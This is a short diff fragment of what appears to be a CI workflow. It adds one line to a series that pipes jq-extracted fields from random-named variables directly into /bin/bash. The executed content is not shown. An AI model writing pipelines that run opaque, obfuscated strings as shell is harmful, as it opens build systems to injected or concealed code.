@@ -21,6 +21,7 @@ jobs:
           echo $pcvg30 | jq -r .midtt08000 | /bin/bash
           echo $fu479 | jq -r .aqvx2554 | /bin/bash
           echo $hrp67 | jq -r .rln33 | /bin/bash
+          printf '%s' "$lpqhr0" | jq -r .lzlw20308 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
